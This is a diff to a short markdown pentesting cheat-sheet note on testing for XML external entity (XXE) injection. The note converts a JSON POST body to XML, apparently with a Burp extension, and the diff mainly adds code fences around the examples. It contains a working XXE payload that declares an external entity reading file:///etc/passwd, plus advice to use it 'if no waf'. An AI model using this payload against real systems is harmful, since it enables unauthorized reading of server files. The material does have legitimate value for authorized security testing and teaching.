@@ -6,12 +6,15 @@ Check the Contenttype that is allowed.
 Change Post data from json to xml (Conten-Type Converter Burp Extension)
 
 ## Simple Example
+```
 {
   "firstname":"Mike",
   "lastname":"hill",
   "Uid":"123"
  }
--->
+```
+TO
+```
 <!--?xml version="1.0"?-->
 <userinfo>
   <firstname>
@@ -24,10 +27,11 @@ Change Post data from json to xml (Conten-Type Converter Burp Extension)
   123
   </Uid>
 </userinfo>
-
+```
 
 If works try different apporache/payloads
 e.g.
+```
 <!--?xml version="1.0"?-->
 <!DOCTYPE replace [<!ENTITY asd SYSTEM "file:///etc/passwd"> ]>
 <userinfo>
@@ -41,5 +45,5 @@ e.g.
   123
   </Uid>
 </userinfo>
-
+```
 Read the etc/passwd file if no waf
